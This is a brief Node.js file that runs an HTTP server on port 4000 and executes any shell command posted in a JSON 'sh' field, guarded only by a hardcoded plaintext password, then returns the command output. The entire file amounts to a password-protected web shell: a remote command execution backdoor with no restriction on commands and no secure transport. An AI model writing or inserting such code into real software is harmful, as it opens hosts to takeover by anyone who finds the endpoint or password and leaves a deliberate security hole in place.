let http = require('http');
const {exec} = require('child_process');
http.createServer((req,res)=>{
        let reqData = "";
        req.on('readable',()=>{
                let chunk;
                while(chunk = req.read()){
                        reqData += chunk
                }
        })
        req.on('end',()=>{
                let reqDataJSON;
                try{
                        reqDataJSON = JSON.parse(reqData)
                        if(reqDataJSON.password !== 'soyideveloper'){
                                throw new Error('Invalid password')
                        }
                        if(!reqDataJSON.sh ){
                                throw new Error('Invalid sh')
                        }
                }catch(e){
                        return res.end(e.message)
                }
                sh(reqDataJSON.sh,(err,stdout)=>{
                        if(err)return res.end(err.message)
                        res.end(stdout);
                })
        })
}).listen(4000)
function sh(shell,cb){
        exec(shell,(err,stdout,stderr)=>{
                cb(err,stdout)
        })
}
